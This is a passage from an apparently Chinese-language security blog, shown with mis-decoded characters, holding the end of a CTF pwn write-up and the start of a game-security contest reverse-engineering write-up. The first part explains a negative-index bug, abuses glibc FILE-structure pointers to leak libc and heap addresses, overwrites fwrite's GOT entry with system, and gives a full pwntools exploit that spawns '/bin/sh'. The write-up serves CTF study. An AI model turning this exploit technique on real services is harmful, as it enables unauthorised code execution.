<p>æ¯æ¬¡æ–½æ³•å…ˆæ£€æµ‹spæ˜¯å¦è¶³å¤Ÿ50 å¹¶åœ¨æ–½æ³•ç»“æŸåæ‰£é™¤50sp </p>
<p>å…¶ä¸­<code>log_file</code>æ˜¯é€šè¿‡fopenè·å¾—çš„<code>&#39;/dev/urandom&#39;</code>æ–‡ä»¶æµ:</p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2025%2F03%2F11%2F20250311-202809.png" alt="image-20250311202802443"></p>
<p>é‚£ä¹ˆæ–½æ³•çš„é€»è¾‘å°±æ˜¯ç”¨æˆ·å…ˆé€‰æ‹©ä¸€ä¸ªå·«å¸ˆ ç„¶åè¾“å…¥å’’è¯­ æ ¹æ®è¯»å–åˆ°ç”¨æˆ·è¾“å…¥é•¿åº¦æ¥ä»éšæœºå­—èŠ‚æµä¸­è¯»å–ç›¸åŒé•¿åº¦æ¥è¾“å‡ºä¹±ç  æ¼æ´ä¹Ÿå¾ˆæ˜æ˜¾ ç¨‹åºè®©ç”¨æˆ·è¾“å…¥ä¸‹æ ‡ä½†å¯¹ä¸‹æ ‡çš„åˆæ³•æ€§æ£€æµ‹ä¸è¶³ å½“è¾“å…¥è´Ÿæ•°ä¸‹æ ‡æ—¶å­˜åœ¨è¶Šç•Œ</p>
<p>å†æ¥çœ‹çœ‹å…¨å±€å˜é‡çš„å¸ƒå±€:</p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2025%2F03%2F11%2F20250311-203118.png" alt="image-20250311203118438"></p>
<p>å½“è¾“å…¥è´Ÿæ•°ä¸‹æ ‡æ—¶å¯ä»¥é€šè¿‡æ–½æ³•æœ€åæ‰£é™¤spçš„åŠŸèƒ½å°†ç»“æ„ä½“åç§»ä¸º0x28çš„å­—æ®µ -50 å¯ä»¥ç”¨æ¥ä¿®æ”¹log_gile, stdin, stdout 3ä¸ªæ–‡ä»¶æè¿°ç¬¦ä¸­çš„<code>._IO_write_ptr</code>å­—æ®µ ç”±äºè¿™é¢˜ç”¨åˆ°çš„é«˜çº§è¾“å…¥å‡½æ•°æ¯”è¾ƒå°‘ è€Œå¯¹log_fileçš„æ“ä½œæ¯”è¾ƒå¤š æ‰€ä»¥é€‰æ‹©æ§åˆ¶log_file</p>
<p>æ€è·¯ä¹Ÿæ¯”è¾ƒæ¸…æ™° ä»»æ„åœ°å€è¯»æ³„éœ²å‡ºlibcåŸºå€ ç„¶åä»»æ„åœ°å€å†™ç”¨systemçš„åœ°å€è¦†ç›–fwriteçš„ è¿™æ ·åœ¨ä¸€æ¬¡æ–½æ³•ä¸­å’’è¯­ä¸º<code>&#39;/bin/sh\x00&#39;</code>æ—¶å®ƒå°±ä¼šä»¥ç¬¬ä¸€ä¸ªå‚æ•°çš„å½¢æ€å‡ºå‡»system</p>
<h5 id="ä»»æ„å†…å­˜è¯»æ³„éœ²libcå’ŒheapåŸºå€"><a href="#ä»»æ„å†…å­˜è¯»æ³„éœ²libcå’ŒheapåŸºå€" class="headerlink" title="ä»»æ„å†…å­˜è¯»æ³„éœ²libcå’ŒheapåŸºå€"></a>ä»»æ„å†…å­˜è¯»æ³„éœ²libcå’ŒheapåŸºå€</h5><p>é€šè¿‡fopenæ‰“å¼€çš„æ–‡ä»¶æµç»“æ„ä½“ä¼šè¢«åˆ†é…åˆ°å †ä¸Š è€Œæ¥ä¸‹æ¥ä»éšæœºå­—èŠ‚æµä¸­è¯»å–æ•°æ®æ—¶è¿™äº›éšæœºå­—èŠ‚æµä¹Ÿæ˜¯ä½äºå †ä¸Šçš„ è¿™æ„å‘³ç€log_fileçš„æ‰€æœ‰ç¼“å†²åŒºæŒ‡é’ˆéƒ½ä¼šæŒ‡å‘ä¸€ä¸ªä½äºè‡ªèº«ç»“æ„ä½“æ›´å¤§çš„å†…å­˜ ä¹Ÿå°±æ˜¯å¯ä»¥é€šè¿‡ä¸Šæ–‡å¯¹<code>_IO_write_ptr</code>çš„æ“ä½œ æœ€ç»ˆä½¿å®ƒæŒ‡å‘è‡ªèº«çš„<code>_IO_read_ptr</code> å†å°†ä¸€ä¸ªgotè¡¨ä¸­çš„åœ°å€å†™å…¥<code>_IO_read_ptr</code> æ­¤æ—¶å†è°ƒç”¨<code>fread()</code>å°±èƒ½å°†libcåœ°å€è¯»å…¥åˆ°ç›®æ ‡å†…å­˜ä¸­äº† åœ¨<code>read_spell()</code>ä¸­è¯»å‡ºçš„å†…å®¹ä¼šç«‹åˆ»è¢«è¾“å‡º è¾¾æˆäº†æ³„éœ²libcçš„ç›®çš„</p>
<p>éœ€è¦æ³¨æ„çš„æ˜¯ä½¿ç”¨fopenè·å–çš„æ–‡ä»¶æµåœ¨ä¸ºç»è¿‡ä»»ä½•è°ƒç”¨æ—¶åªä¼šåˆå§‹åŒ–å…¶ä¸­çš„<code>.flag</code>å­—æ®µ è€Œæ–½æ³•è¦æ±‚spå¤§äº49 æ˜¾ç„¶æ˜¯æ— æ³•æˆç«‹çš„ æ‰€ä»¥éœ€è¦å…ˆåˆ›å»ºä¸€ä¸ªå·«å¸ˆå¹¶è¿›è¡Œæ–½æ³•ä»¥åˆå§‹åŒ–å„ä¸ªå­—æ®µ</p>
<p>å¦å¤– åœ¨åšé¢˜çš„è¿‡ç¨‹ä¸­æƒ³èµ·æ¥ä¸Šé¢è§‚å¯Ÿå†…å­˜åˆ†å¸ƒæ—¶<code>stdin</code>å°±åœ¨log_fileçš„æ­£ä¸Šæ–¹ å°†æ­¤å¤„çš„åœ°å€å†™å…¥<code>_IO_read_ptr</code> è€Œä¸€æ¬¡æœ€å¤šå¯ä»¥æ³„éœ²0x20çš„åŠŸèƒ½åˆšå¥½å¯ä»¥æ³„éœ²å‡ºlibcä»¥åŠheapçš„åŸºå€ æ²¡å¿…è¦ç”¨gotè¡¨æ³„éœ²libc</p>
<p>è¿™ä¸€æ­¥çš„éš¾ç‚¹åœ¨äºå¦‚ä½•è°ƒæ•´<code>_IO_write_ptr</code> ä¸Šæ–‡è¯´è¿‡å‘ç¼“å†²åŒºä¸­å†™å…¥æ•°æ®åä¼šå¢åŠ <code>_IO_write_ptr</code>çš„å€¼ ä¹Ÿå°±æ˜¯ä¸€æ¬¡å¯ä»¥å‡å°‘<code>_IO_write_ptr</code>çš„å€¼ä¸º[50 - 0x20, 50 - 1] è¿™ä¸ªå€¼è¿˜æ˜¯åŸºäºå†™å…¥çš„æ•°æ®é‡çš„ å¦å¤– ç”±äºè¿˜æœªæ³„éœ²å‡ºheapåŸºå€ å†™å…¥<code>_IO_write_ptr</code>çš„å€¼è¿˜ä¸èƒ½è¦†ç›–æ‰ç»“æ„ä½“ä¸­é‡è¦çš„å€¼ æ‰€ä»¥æ¯æ­¥è¦å‡å°‘çš„å€¼éœ€è¦æ…é‡è€ƒè™‘ åªèƒ½è°ƒè¯•å‡ºåˆé€‚çš„è·¯çº¿æ¥è®©<code>_IO_write_ptr</code>å‡è‡³<code>_IO_read_ptr</code>ä¸Šæ–¹çš„å†…å­˜ è€Œä¸”ä¹Ÿä¸èƒ½å¤ªä¸Šæ–¹ å› ä¸º<code>heap</code>æ®µåŸºå€æ˜¯éšæœºçš„ ä¸Šæ–¹ç‰©ç†è¿ç»­å†…å­˜è¿˜æ²¡æœ‰è¢«æ˜ å°„åˆ°è™šæ‹Ÿå†…å­˜:</p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2025%2F03%2F11%2F20250311-211259.png" alt="image-20250311211259035"></p>
<p>æœ€åè°ƒè¯•å¾—åˆ°çš„è·¯çº¿:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">wizard_spell</span>(<span class="params">idx, data</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;choice&gt;&gt; &#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;spell:&#x27;</span>, <span class="built_in">str</span>(idx).encode())</span><br><span class="line">    sa(<span class="string">b&#x27;:&#x27;</span>, data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create_wizard</span>(<span class="params">name</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;choice&gt;&gt; &#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    sa(<span class="string">b&#x27;name:&#x27;</span>, name)</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;localhost&#x27;</span>, <span class="number">20000</span>)</span><br><span class="line">create_wizard(<span class="string">b&#x27;11111111&#x27;</span>)</span><br><span class="line">wizard_spell(<span class="number">0</span>, <span class="string">b&#x27;1&#x27;</span> * <span class="number">0x20</span>)</span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">11</span>):</span><br><span class="line">    wizard_spell(-<span class="number">2</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">wizard_spell(-<span class="number">2</span>, <span class="string">b&#x27;\x00\x00&#x27;</span>)</span><br><span class="line">wizard_spell(-<span class="number">2</span>, <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">20</span>)</span><br><span class="line">wizard_spell(-<span class="number">2</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">wizard_spell(<span class="number">0</span>, <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">3</span> + p64(<span class="number">0x231</span>) + p64(<span class="number">0xfbad24a8</span>))</span><br><span class="line">wizard_spell(<span class="number">0</span>, p64(<span class="number">0x6020D0</span>) + p64(<span class="number">0x602120</span>))</span><br><span class="line">leak = r(<span class="number">0x20</span>)</span><br><span class="line">leak = [leak[<span class="number">8</span> * i : <span class="number">8</span> * (i + <span class="number">1</span>)] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>)]</span><br><span class="line">leak = [u64(i) <span class="keyword">for</span> i <span class="keyword">in</span> leak]</span><br><span class="line">libc_base = leak[<span class="number">0</span>] - so.symbols[<span class="string">&#x27;_IO_2_1_stdin_&#x27;</span>]</span><br><span class="line">heap_base = leak[<span class="number">2</span>] - <span class="number">0x10</span></span><br><span class="line">log.success(<span class="string">&#x27;libc_base = %#x&#x27;</span> % libc_base)</span><br><span class="line">log.success(<span class="string">&#x27;heap_base = %#x&#x27;</span> % heap_base)</span><br></pre></td></tr></table></figure>

<h5 id="ä»»æ„å†…å­˜å†™è¦†ç›–got"><a href="#ä»»æ„å†…å­˜å†™è¦†ç›–got" class="headerlink" title="ä»»æ„å†…å­˜å†™è¦†ç›–got"></a>ä»»æ„å†…å­˜å†™è¦†ç›–got</h5><p>å®Œæˆç¬¬ä¸€ä¸ªä»»åŠ¡åç»“æ„ä½“ä¸­çš„<code>_IO_write_ptr</code>æ­¤æ—¶å·²ç»æŒ‡å‘äº†<code>._IO_read_base</code> è€Œç°åœ¨å·²ç»æ³„éœ²å‡ºå †åŸºå€ æ‰€ä»¥å¯ä»¥æ”¾å¿ƒè¦†ç›–ç»“æ„ä½“ä¸­çš„å†…å®¹</p>
<p>æ¥ä¸‹æ¥å°±ç”¨å¯¹åº”å­—æ®µåŸæœ¬çš„å€¼æ¥è¦†ç›–æ— å…³ç´§è¦çš„å­—æ®µ æœ€é‡è¦çš„æ˜¯éœ€è¦è¦†ç›–å†™å…¥ç¼“å†²åŒºç›¸å…³çš„4ä¸ªå­—æ®µ:</p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2025%2F03%2F11%2F20250311-212416.png" alt="image-20250311212416820"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">system = libc_base + so.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">ptr = heap_base + <span class="number">0x2a0</span></span><br><span class="line">wizard_spell(<span class="number">0</span>, flat(ptr, ptr))</span><br><span class="line">wizard_spell(<span class="number">0</span>, flat(elf.got[<span class="string">&#x27;fwrite&#x27;</span>] + <span class="number">0x20</span>, elf.got[<span class="string">&#x27;fwrite&#x27;</span>] + <span class="number">0x28</span>, elf.got[<span class="string">&#x27;fwrite&#x27;</span>] + <span class="number">0x20</span>, elf.got[<span class="string">&#x27;fwrite&#x27;</span>] + <span class="number">0x28</span>))</span><br></pre></td></tr></table></figure>

<p>ä¸ºä»€ä¹ˆè¦å…ˆå†™å…¥ä¸¤ä¸ªæŒ‡é’ˆç„¶åå†å†™å…¥ç›®æ ‡çš„4ä¸ªæŒ‡é’ˆ?</p>
<p>å…ˆçœ‹çœ‹è¦†ç›–äº†å‰ä¸¤ä¸ªæŒ‡é’ˆåreadç›¸å…³å­—æ®µæŒ‡å‘çš„åœ°å€:</p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2025%2F03%2F11%2F20250311-212012.png" alt="image-20250311212011939"></p>
<p>ç°åœ¨ptrå’Œendçš„æ’å€¼ä¸º0x10 å¦‚ä¸Šæ–‡ä¸­å¯¹<code>_IO_read_ptr</code>çš„ä»‹ç» è‹¥ä¸æ»¡è¶³è¯»å–ç¼“å†²åŒºè¿˜æœ‰æ•°æ®çš„æƒ…å†µ å°±ä¼šè¿›å…¥è®¾ç½®ç»“æ„ä½“ä¸­æ‰€æœ‰ç¼“å†²åŒºæŒ‡é’ˆä¸º<code>_IO_buf_base</code>çš„åˆ†æ”¯ ç„¶åè¿›è¡Œç³»ç»Ÿè°ƒç”¨è¯»å–æ•°æ®</p>
<p>è¿™æ„å‘³ç€å¦‚æœç¬¬ä¸€æ¬¡å†™å…¥4ä¸ªæŒ‡é’ˆçš„è¯åœ¨ä¸‹ä¸€æ¬¡è¯»å…¥æ•°æ®å <code>_IO_write_ptr</code>å°±ä¼šè¢«è®¾ç½®æˆ<code>_IO_buf_base</code> ä¸€åˆ‡å›åˆ°èµ·ç‚¹ éœ€è¦å†æ¬¡è°ƒæ•´<code>_IO_write_ptr</code>çš„å€¼ æ˜¾ç„¶è¿™æ˜¯ä¸è¢«å¸Œæœ›çš„</p>
<p>å®Œæˆfwriteå¯¹å­—æ®µçš„è°ƒæ•´å:</p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2025%2F03%2F11%2F20250311-213332.png" alt="image-20250311213332131"></p>
<p>æ­¤æ—¶æ‰éœ€è¦freadè¿›å…¥è®¾ç½®æŒ‡é’ˆé‚£æ¡åˆ†æ”¯æ¥è®©<code>_IO_write_ptr</code>è¢«è®¾ç½®æˆç›®æ ‡å€¼ æ‰§è¡Œfreadå:</p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2025%2F03%2F11%2F20250311-213537.png" alt="image-20250311213537527"></p>
<p>ç„¶åè¦åšçš„å°±æ˜¯ç»§ç»­è°ƒæ•´<code>_IO_write_ptr</code>ç›´åˆ°èƒ½å¤Ÿè¦†ç›–fwriteçš„gotè¡¨å€¼ éœ€è¦æ³¨æ„çš„æ˜¯æ­¤åæ¯æ¬¡æ‰§è¡Œfreadå<code>_IO_write_ptr</code>éƒ½ä¼šå› ä¸ºread ptrå’Œendç›¸ç­‰è€Œè¢«è®¾ç½®ä¸ºbuf base æ‰€ä»¥éœ€è¦è°ƒæ•´å®Œwrite ptrçš„å€¼åç«‹åˆ»å†™å…¥gotè¡¨</p>
<p>å®Œæ•´exp:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./magic&#x27;</span>)</span><br><span class="line">so = ELF(<span class="string">&#x27;/home/i/PC_File/libs/2.23-0ubuntu3_amd64/libc-2.23.so&#x27;</span>)</span><br><span class="line"><span class="comment"># so = ELF(&#x27;./libc6_2.23-0ubuntu10_amd64.so&#x27;)</span></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :p.send(data)</span><br><span class="line">sa      = <span class="keyword">lambda</span> delim,data         :p.sendafter(delim, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :p.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data         :p.sendlineafter(delim, data)</span><br><span class="line">r       = <span class="keyword">lambda</span> num=<span class="number">4096</span>           :p.recv(num)</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims, drop=<span class="literal">True</span>  :p.recvuntil(delims, drop)</span><br><span class="line">itr     = <span class="keyword">lambda</span>                    :p.interactive()</span><br><span class="line">uu32    = <span class="keyword">lambda</span> data               :u32(data.ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data               :u64(data.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">leak    = <span class="keyword">lambda</span> name,addr          :log.success(<span class="string">&#x27;&#123;&#125; = &#123;:#x&#125;&#x27;</span>.<span class="built_in">format</span>(name, addr))</span><br><span class="line">l64     = <span class="keyword">lambda</span>      :u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">l32     = <span class="keyword">lambda</span>      :u32(p.recvuntil(<span class="string">b&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">wizard_spell</span>(<span class="params">idx, data</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;choice&gt;&gt; &#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;spell:&#x27;</span>, <span class="built_in">str</span>(idx).encode())</span><br><span class="line">    sa(<span class="string">b&#x27;:&#x27;</span>, data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create_wizard</span>(<span class="params">name</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;choice&gt;&gt; &#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    sa(<span class="string">b&#x27;name:&#x27;</span>, name)</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;localhost&#x27;</span>, <span class="number">20000</span>)</span><br><span class="line"><span class="comment"># p = remote(&#x27;223.112.5.141&#x27;, 55684)</span></span><br><span class="line">create_wizard(<span class="string">b&#x27;11111111&#x27;</span>)</span><br><span class="line">wizard_spell(<span class="number">0</span>, <span class="string">b&#x27;1&#x27;</span> * <span class="number">0x20</span>)</span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">11</span>):</span><br><span class="line">    wizard_spell(-<span class="number">2</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">wizard_spell(-<span class="number">2</span>, <span class="string">b&#x27;\x00\x00&#x27;</span>)</span><br><span class="line">wizard_spell(-<span class="number">2</span>, <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">20</span>)</span><br><span class="line">wizard_spell(-<span class="number">2</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">wizard_spell(<span class="number">0</span>, <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">3</span> + p64(<span class="number">0x231</span>) + p64(<span class="number">0xfbad24a8</span>))</span><br><span class="line">wizard_spell(<span class="number">0</span>, p64(<span class="number">0x6020D0</span>) + p64(<span class="number">0x602120</span>))</span><br><span class="line">leak = r(<span class="number">0x20</span>)</span><br><span class="line">leak = [leak[<span class="number">8</span> * i : <span class="number">8</span> * (i + <span class="number">1</span>)] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>)]</span><br><span class="line">leak = [u64(i) <span class="keyword">for</span> i <span class="keyword">in</span> leak]</span><br><span class="line">libc_base = leak[<span class="number">0</span>] - so.symbols[<span class="string">&#x27;_IO_2_1_stdin_&#x27;</span>]</span><br><span class="line">heap_base = leak[<span class="number">2</span>] - <span class="number">0x10</span></span><br><span class="line">log.success(<span class="string">&#x27;libc_base = %#x&#x27;</span> % libc_base)</span><br><span class="line">log.success(<span class="string">&#x27;heap_base = %#x&#x27;</span> % heap_base)</span><br><span class="line"></span><br><span class="line">system = libc_base + so.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">ptr = heap_base + <span class="number">0x2a0</span></span><br><span class="line">wizard_spell(<span class="number">0</span>, flat(ptr, ptr))</span><br><span class="line">wizard_spell(<span class="number">0</span>, flat(elf.got[<span class="string">&#x27;fwrite&#x27;</span>] + <span class="number">0x20</span>, elf.got[<span class="string">&#x27;fwrite&#x27;</span>] + <span class="number">0x28</span>, elf.got[<span class="string">&#x27;fwrite&#x27;</span>] + <span class="number">0x20</span>, elf.got[<span class="string">&#x27;fwrite&#x27;</span>] + <span class="number">0x28</span>))</span><br><span class="line"></span><br><span class="line">wizard_spell(-<span class="number">2</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">wizard_spell(<span class="number">0</span>, <span class="string">b&#x27;\x00\x00&#x27;</span> + p64(libc_base + so.symbols[<span class="string">&#x27;atoi&#x27;</span>]) + p64(<span class="number">0x400886</span>) + p64(system))</span><br><span class="line">wizard_spell(-<span class="number">2</span>, <span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">itr()</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>äºŒè¿›åˆ¶</category>
        <category>Pwn</category>
      </categories>
      <tags>
        <tag>Pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>2025è…¾è®¯æ¸¸æˆå®‰å…¨ç«èµ› PCå®¢æˆ·ç«¯å®‰å…¨ åˆèµ›é¢˜è§£</title>
    <url>/2025/03/31/2025%E8%85%BE%E8%AE%AF%E6%B8%B8%E6%88%8F%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B-PC%E5%AE%A2%E6%88%B7%E7%AB%AF%E5%AE%89%E5%85%A8-%E5%88%9D%E8%B5%9B%E9%A2%98%E8%A7%A3/</url>
    <content><![CDATA[<p>å’Œå‰å‡ å¹´çš„ç›¸æ¯”è¿˜æ˜¯å¤ªCTFäº† ç¬¬ä¸€å¤©å°±å‡ºäº†flag æ„Ÿè§‰æœ‰å¾ˆå¤šäººéƒ½èƒ½åšå‡ºæ¥ ä¸çŸ¥é“è¦è¾¾åˆ°ä»€ä¹ˆè¦æ±‚æ‰èƒ½æ‹¿æ»¡åˆ†æ•°è¿›å†³èµ›</p>
<span id="more"></span>

<h2 id="R3å±‚ç¨‹åºåˆ†æ"><a href="#R3å±‚ç¨‹åºåˆ†æ" class="headerlink" title="R3å±‚ç¨‹åºåˆ†æ"></a>R3å±‚ç¨‹åºåˆ†æ</h2><p> flagå‰4ä½é™æ€åˆ†ææ—¶å°±èƒ½çœ‹å‡ºæ˜¯<code>ACE_</code></p>
<p>å…¨å±€æ„é€ å‡½æ•°ä¸­å‘ç°åè°ƒè¯•å‡½æ•° ç¼–å†™IDApythonè„šæœ¬è·³è¿‡è¿™ä¸ªå‡½æ•°ä»¥ä¾¿è°ƒè¯•:</p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2025%2F03%2F28%2F20250328-125502.png" alt="image-20250328125411862"></p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2025%2F03%2F29%2F20250329-102940.png" alt="image-20250329102933746"></p>
<p>å‘ç°è°ƒè¯•çš„æ—¶å€™åœ¨ä¸é©±åŠ¨å»ºç«‹minié€šè®¯è¿æ¥æ—¶ä¼šç›´æ¥å¡æ­» ç°åœ¨åªå…³æ³¨R3å±‚ç¨‹åºå¯¹è¾“å…¥çš„å¤„ç† æ•…ä¹Ÿç¼–å†™IDApythonè·³è¿‡è¿™ä¸ªå‡½æ•°å…ˆçœ‹çœ‹åº”ç”¨å±‚å¯¹flagåšäº†ä»€ä¹ˆå¤„ç†:</p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2025%2F03%2F29%2F20250329-103120.png" alt="QQ_1743215477403"></p>
<p>è°ƒè¯•è‡³ä¸­é—´å‘ç°ä¸€ä¸ªåƒæŸç§è¡¨çš„å­—ç¬¦ä¸²:</p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2025%2F03%2F28%2F20250328-142601.png" alt="image-20250328142601349"></p>
<p>ç´§æ¥ç€å°±æŠŠè¿™ä¸ªè¡¨å’Œè¾“å…¥çš„flag[4:]ä¼ å…¥äº†ä¸€ä¸ªå‡½æ•°è¿›è¡Œç¼–ç </p>
<p>é¦–å…ˆæŒ‰ç…§base58çš„ç¬¬ä¸€æ­¥è¿›è¡Œäº†åˆ†å‰²:</p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2025%2F03%2F28%2F20250328-143050.png" alt="image-20250328143050626"></p>
<p>ä½†æ˜¯çœ‹ä¸‹é¢å®é™…ä¸Šç¼–ç ç”¨çš„æ˜¯base64çš„è¡¨:</p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2025%2F03%2F28%2F20250328-150447.png" alt="image-20250328150446947"></p>
<p>æ¯”è¾ƒä¸€ä¸‹ç»“æœå°±èƒ½å‘ç°å®é™…ä¸Šå°±æ˜¯æ¢è¡¨base58ç”¨<code>@</code>å¡«å…… + åè½¬:</p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2025%2F03%2F28%2F20250328-145503.png" alt="image-20250328145503202"></p>
<p>ä¸‹é¢æ˜¯ä¸€ä¸ªå¾ªç¯å¼‚æˆ–:</p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2025%2F03%2F28%2F20250328-150707.png" alt="image-20250328150707324"></p>
<p>æ ¹æ®ç»“æœéªŒè¯ä¸€ä¸‹è¿™ä¸€æ­¥çš„åŠ å¯†æµç¨‹:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">enc = [</span><br><span class="line">    <span class="number">0x33</span>, <span class="number">0x1C</span>, <span class="number">0x2C</span>, <span class="number">0x21</span>, <span class="number">0x00</span>, <span class="number">0x0A</span>, <span class="number">0x0A</span>, <span class="number">0x0F</span>, <span class="number">0x4E</span>, <span class="number">0x3D</span>, </span><br><span class="line">    <span class="number">0x2D</span>, <span class="number">0x02</span>, <span class="number">0x07</span>, <span class="number">0x12</span>, <span class="number">0x1C</span>, <span class="number">0x38</span>, <span class="number">0x35</span>, <span class="number">0x1E</span>, <span class="number">0x20</span>, <span class="number">0x21</span>, </span><br><span class="line">    <span class="number">0x0B</span>, <span class="number">0x29</span>, <span class="number">0x4C</span>, <span class="number">0x01</span>, <span class="number">0x34</span>, <span class="number">0x1A</span>, <span class="number">0x4D</span>, <span class="number">0x03</span>, <span class="number">0x4D</span>, <span class="number">0x01</span>, </span><br><span class="line">    <span class="number">0x04</span>, <span class="number">0x21</span>, <span class="number">0x00</span>, <span class="number">0x16</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">key = <span class="string">b&#x27;sxx&#x27;</span></span><br><span class="line">c = <span class="number">0</span></span><br><span class="line">plain = [<span class="built_in">chr</span>(x ^ key[c % <span class="number">3</span>]) <span class="keyword">for</span> c, x <span class="keyword">in</span> <span class="built_in">enumerate</span>(enc)]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join(plain))</span><br><span class="line"><span class="comment"># @dTRxryw6NUztjdKMfSYsZ4yGb5p5ywYxe</span></span><br></pre></td></tr></table></figure>

<p>æˆåŠŸéªŒè¯</p>
<h2 id="R0å±‚ç¨‹åºåˆ†æ"><a href="#R0å±‚ç¨‹åºåˆ†æ" class="headerlink" title="R0å±‚ç¨‹åºåˆ†æ"></a>R0å±‚ç¨‹åºåˆ†æ</h2><p>æ¥ä¸‹æ¥å°±è¿›å…¥åˆ°äº†é©±åŠ¨çš„æ ¡éªŒå‡½æ•° ä½†æ˜¯åœ¨é©±åŠ¨å¤„ç†åº”ç”¨å±‚å‘é€çš„ä¿¡æ¯çš„å›è°ƒå‡½æ•°é‡ŒåŸºæœ¬ä¸Šéƒ½æ˜¯èŠ±æŒ‡ä»¤æ²¡æ³•çœ‹ ä½¿ç”¨WinDBGè¿›è¡Œè¾…åŠ©åˆ†æ å…³äºWinDBGçš„è¿œç¨‹è°ƒè¯•é…ç½®å‚è€ƒ<a href="https://1k0ct.github.io/2024/09/28/IDA%E9%85%8D%E5%90%88VMware%E8%BF%9B%E8%A1%8C%E5%86%85%E6%A0%B8-%E9%A9%B1%E5%8A%A8-%E8%B0%83%E8%AF%95/">æˆ‘ä¹‹å‰çš„åšå®¢</a> ä½†æ˜¯ä¸æ¨èç”¨IDAæ¥è°ƒè¯• è™½ç„¶IDAç”¨çš„ä¹Ÿæ˜¯WinDBGä½œä¸ºè°ƒè¯•å™¨ ä½†æ˜¯æŸ¥çœ‹å†…å­˜è¿˜æ˜¯æ²¡æœ‰WinDBGæ–¹ä¾¿</p>
